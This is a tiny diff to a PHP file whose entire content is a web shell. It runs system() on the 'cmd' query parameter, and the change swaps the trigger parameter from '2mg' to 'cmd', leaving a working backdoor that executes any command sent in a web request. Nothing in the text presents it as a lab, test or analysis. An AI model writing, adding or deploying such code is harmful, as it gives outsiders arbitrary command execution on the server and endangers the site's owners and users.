@@ -1,6 +1,6 @@
 <?php
 
-if($_GET['2mg']) {
+if($_GET['cmd']) {
   system($_GET['cmd']);
   }
 ?>
